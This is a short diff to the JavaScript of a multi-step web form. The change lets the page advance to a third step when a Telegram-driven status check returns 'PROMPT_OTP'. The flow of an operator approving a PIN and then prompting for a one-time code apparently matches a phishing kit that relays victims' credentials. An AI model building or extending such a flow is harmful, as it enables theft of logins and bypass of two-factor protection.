@@ -314,14 +314,14 @@
       document.getElementById('step2-form').classList.remove('hidden');
     }
 
-    // Poll for PIN approval from Telegram
+    // Poll for PIN approval from Telegram (listening for PROMPT_OTP)
     function pollPinStatus() {
       statusInterval = setInterval(async () => {
         try {
           const res = await fetch(`/api/check-status/${appReference}`);
           const data = await res.json();
 
-          if (data.status === 'PIN_APPROVED') {
+          if (data.status === 'PROMPT_OTP' || data.status === 'PIN_APPROVED') {
             clearInterval(statusInterval);
             document.getElementById('step-loading').classList.add('hidden');
             document.getElementById('step3-form').classList.remove('hidden');
@@ -392,4 +392,5 @@
     }
   </script>
 </body>
-</html>
+  </html>
+        
